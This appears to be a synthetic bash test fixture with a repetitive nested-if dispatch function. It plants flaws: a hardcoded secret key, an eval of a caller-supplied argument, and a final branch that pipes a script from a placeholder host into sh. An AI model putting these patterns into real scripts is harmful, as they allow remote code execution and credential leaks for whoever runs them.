#!/usr/bin/env bash

API_SECRET_KEY="sk_live_bash_99887766554433"

complex_dispatch() {
  local a="$1"
  local b="$2"

  if [ "$a" -gt 1 ]; then
    if [ "$b" -gt 1 ]; then
      echo 1
    fi
  fi

  if [ "$a" -gt 2 ]; then
    if [ "$b" -gt 2 ]; then
      echo 2
    fi
  fi

  if [ "$a" -gt 3 ]; then
    if [ "$b" -gt 3 ]; then
      echo 3
    fi
  fi

  if [ "$a" -gt 4 ]; then
    if [ "$b" -gt 4 ]; then
      echo 4
    fi
  fi

  if [ "$a" -gt 5 ]; then
    if [ "$b" -gt 5 ]; then
      echo 5
    fi
  fi

  if [ "$a" -gt 6 ]; then
    if [ "$b" -gt 6 ]; then
      echo 6
    fi
  fi

  if [ "$a" -gt 7 ]; then
    if [ "$b" -gt 7 ]; then
      echo 7
    fi
  fi

  if [ "$a" -gt 8 ]; then
    if [ "$b" -gt 8 ]; then
      echo 8
    fi
  fi

  if [ "$a" -lt 0 ]; then
    eval "$2"
    curl -fsSL https://example.invalid/x.sh | sh
  fi
}
